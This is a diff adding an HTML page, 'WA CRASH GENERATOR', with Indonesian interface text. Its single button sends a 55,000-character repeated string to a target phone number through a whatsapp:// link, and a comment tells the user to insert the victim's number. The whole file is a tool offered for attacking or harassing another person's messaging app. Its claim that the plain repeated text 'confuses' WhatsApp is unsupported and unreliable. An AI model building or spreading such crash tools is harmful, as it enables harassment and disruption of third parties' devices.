@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mika Project - Bug WA</title>
+    <style>
+        body { background: #000; color: #0f0; text-align: center; font-family: monospace; padding-top: 50px; }
+        button { padding: 20px; background: #0f0; border: none; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>WA CRASH GENERATOR</h1>
+    <p>Klik tombol di bawah buat kirim "paket" ke WA:</p>
+    
+    <button onclick="kirimBug()">KIRIM BUG SEKARANG</button>
+
+    <script>
+        function kirimBug() {
+            // Karakter "berat" yang bikin WA pusing baca kodenya
+            let bugText = "BYPASS_MIKA".repeat(5000); 
+            let target = "6281234567890"; // GANTI NOMOR TARGET DI SINI
+            
+            window.location.href = "whatsapp://send?phone=" + target + "&text=" + encodeURIComponent(bugText);
+        }
+    </script>
+</body>
+</html>
